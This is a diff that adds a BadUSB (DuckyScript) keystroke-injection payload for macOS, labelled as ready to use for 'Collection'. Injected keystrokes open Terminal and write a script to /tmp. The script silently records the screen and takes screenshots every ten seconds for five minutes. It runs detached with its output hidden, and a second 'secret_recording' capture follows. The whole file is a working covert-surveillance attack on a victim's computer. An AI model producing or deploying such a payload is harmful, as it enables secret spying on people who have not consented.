@@ -1,0 +1,50 @@
+REM Title: macOS Screen Recorder
+REM Author: BadUSB Library
+REM Description: Records screen activity and saves to file
+REM Target: macOS 10.15+
+REM Category: Collection
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create screen recording script
+STRING cat > /tmp/screen_record.sh << 'EOF'
+#!/bin/bash
+
+# Create recordings directory
+mkdir -p ~/Desktop/ScreenRecordings
+
+# Start screen recording
+echo "Starting screen recording..."
+screencapture -v -T 0 -x ~/Desktop/ScreenRecordings/screen_$(date +%Y%m%d_%H%M%S).mov
+
+# Also take screenshots every 10 seconds
+echo "Starting screenshot capture..."
+while true; do
+    screencapture -x ~/Desktop/ScreenRecordings/screenshot_$(date +%Y%m%d_%H%M%S).png
+    sleep 10
+done &
+
+# Record for 5 minutes then stop
+sleep 300
+pkill -f screencapture
+echo "Screen recording completed. Files saved to ~/Desktop/ScreenRecordings/"
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/screen_record.sh
+ENTER
+STRING nohup /tmp/screen_record.sh > /dev/null 2>&1 &
+ENTER
+
+REM Also create a simpler version
+STRING screencapture -v -T 0 -x ~/Desktop/secret_recording.mov
+ENTER
